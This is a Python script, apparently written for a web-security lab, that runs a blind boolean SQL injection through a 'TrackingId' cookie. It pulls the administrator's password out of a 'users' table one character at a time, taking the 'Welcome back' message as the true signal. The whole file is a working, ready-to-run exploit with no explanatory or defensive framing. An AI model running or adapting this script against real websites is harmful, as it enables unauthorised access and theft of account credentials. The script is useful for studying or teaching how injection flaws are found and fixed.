import requests
from urllib.parse import urlparse, parse_qs
import argparse

alpha_numeric = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def is_server_error(code):
    return str(code)[0] == '5'
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", dest="url")
    args = parser.parse_args()
    o = urlparse(args.url)
    url = o._replace(query=None).geturl()


    admin_password=""
    i=1
    end=False
    while not end:
        end=True
        for c in alpha_numeric:
            #Change the cookie id here
            cookies={"TrackingId":"gSbbiQa0VGh4L0R2' and SUBSTR((SELECT password FROM users WHERE username='administrator'),"+ str(i) +",1) ='" + c }
            resp = requests.get(url, cookies=cookies)
            
            #print(resp.text)
            for line in resp.text.splitlines():
                if "Welcome back" in line:
                    admin_password+=c
                    print(admin_password)
                    i+=1
                    end=False
                    break


    print("Final output: {}".format(admin_password))



if __name__ == "__main__":
    main()